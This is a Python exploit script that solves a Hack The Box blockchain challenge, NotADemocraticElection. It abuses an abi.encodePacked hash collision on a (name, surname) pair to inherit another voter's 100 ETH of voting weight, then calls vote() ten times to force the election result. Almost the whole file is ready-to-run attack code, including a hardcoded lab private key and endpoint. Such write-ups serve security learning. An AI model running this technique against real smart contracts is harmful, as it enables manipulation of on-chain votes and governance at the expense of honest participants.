#!/usr/bin/env python3
"""
NotADemocraticElection (HTB Try Out, easy blockchain) — solver.

Vulnerability: abi.encodePacked(_name, _surname) is ambiguous ("Satoshi","Nakamoto"
and "SatoshiNakamoto","" both pack to the same bytes "SatoshiNakamoto"), while the
deposit uniqueness check uses the exact (name, surname) strings. Setup deposited
100 ETH under ("Satoshi","Nakamoto"), so voters["SatoshiNakamoto"].weight = 100e18.
We deposit a colliding pair, inherit that weight, then call vote() repeatedly for
CIM (vote() has no per-voter limit) — each vote adds ~100e18 to CIM's total.
10 votes reach TARGET_VOTES = 1000e18 and set winner = CIM, solving Setup.
"""

import argparse
import json
import time

from web3 import Web3

RPC = "http://154.57.164.75:30261"
PRIVATE_KEY = "0x848604719485baba39fb8fa119efe30113e5eb27fb00cf1938279a35ec01f32f"
TARGET = "0xFdC6a6d53505c3EE15d5a655E2C157eC3B7225D1"   # NotADemocraticElection
SETUP = "0x2e33a9708B90c971B331d342876dE54511A63Aa8"     # Setup

ABI = json.loads(
    """
[
  {"type":"function","name":"depositVoteCollateral","stateMutability":"payable",
   "inputs":[{"name":"_name","type":"string"},{"name":"_surname","type":"string"}],
   "outputs":[]},
  {"type":"function","name":"vote","stateMutability":"nonpayable",
   "inputs":[{"name":"_party","type":"bytes3"},{"name":"_name","type":"string"},
             {"name":"_surname","type":"string"}],"outputs":[]},
  {"type":"function","name":"getVotesCount","stateMutability":"view",
   "inputs":[{"name":"_party","type":"bytes3"}],"outputs":[{"name":"","type":"uint256"}]},
  {"type":"function","name":"checkWinner","stateMutability":"nonpayable",
   "inputs":[{"name":"_party","type":"bytes3"}],"outputs":[]},
  {"type":"function","name":"winner","stateMutability":"view","inputs":[],
   "outputs":[{"name":"","type":"bytes3"}]},
  {"type":"function","name":"parties","stateMutability":"view",
   "inputs":[{"name":"_id","type":"bytes3"}],
   "outputs":[{"name":"fullname","type":"string"},{"name":"totalvotes","type":"uint256"}]},
  {"type":"function","name":"isSolved","stateMutability":"view","inputs":[],
   "outputs":[{"name":"","type":"bool"}]}
]
"""
)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--rpc", default=RPC)
    ap.add_argument("--key", default=PRIVATE_KEY)
    ap.add_argument("--target", default=TARGET)
    ap.add_argument("--setup", default=SETUP)
    args = ap.parse_args()

    w3 = Web3(Web3.HTTPProvider(args.rpc, request_kwargs={"timeout": 30}))
    assert w3.is_connected(), "RPC not reachable"
    acct = w3.eth.account.from_key(args.key)
    me = acct.address
    print(f"[*] chainId={w3.eth.chain_id} block={w3.eth.block_number}")
    print(f"[*] player={me} balance={w3.eth.get_balance(me)}")

    target = w3.eth.contract(address=args.target, abi=ABI)

    CIM = Web3.to_bytes(text="CIM")  # b'CIM'
    ALF = Web3.to_bytes(text="ALF")
    print(f"[*] ALF votes={target.functions.getVotesCount(ALF).call()}")
    print(f"[*] CIM votes={target.functions.getVotesCount(CIM).call()}")

    nonce = w3.eth.get_transaction_count(me)
    gas_price = w3.eth.gas_price

    def send(tx, label, value=0):
        nonlocal nonce
        built = tx.build_transaction(
            {
                "from": me,
                "nonce": nonce,
                "gas": 300_000,
                "gasPrice": gas_price,
                "value": value,
            }
        )
        signed = acct.sign_transaction(built)
        txh = w3.eth.send_raw_transaction(signed.raw_transaction)
        print(f"[+] {label}: {txh.hex()}")
        receipt = w3.eth.wait_for_transaction_receipt(txh, timeout=120)
        assert receipt.status == 1, f"tx {label} reverted: {receipt}"
        nonce += 1
        return txh

    # 1) Deposit with colliding (name, surname) so our sig == "SatoshiNakamoto".
    #    uniqueVoters["SatoshiNakamoto"][""] was unset -> allowed.
    #    voters["SatoshiNakamoto"].weight = 100e18 (Setup's deposit) + 1 wei.
    tx1 = send(
        target.functions.depositVoteCollateral("SatoshiNakamoto", ""),
        "deposit (colliding sig)",
        value=1,
    )

    # 2) Vote for CIM 10 times -> CIM totalvotes = 10 * (100e18+1) >= 1000e18
    txs = [tx1]
    for i in range(10):
        txs.append(
            send(target.functions.vote(CIM, "SatoshiNakamoto", ""), f"vote CIM #{i+1}")
        )

    print(f"[*] winner={target.functions.winner().call()}")
    print(f"[*] CIM votes={target.functions.getVotesCount(CIM).call()}")
    setup = w3.eth.contract(address=args.setup, abi=ABI)  # only need isSolved
    print(f"[*] isSolved={setup.functions.isSolved().call()}")

    with open("solve/evidence/txs.json", "w") as f:
        json.dump(
            {
                "rpc": args.rpc,
                "target": args.target,
                "setup": args.setup,
                "player": me,
                "txs": [t.hex() for t in txs],
                "winner": target.functions.winner().call(),
                "isSolved": setup.functions.isSolved().call(),
            },
            f,
            indent=2,
        )
    print("[*] evidence written")


if __name__ == "__main__":
    main()
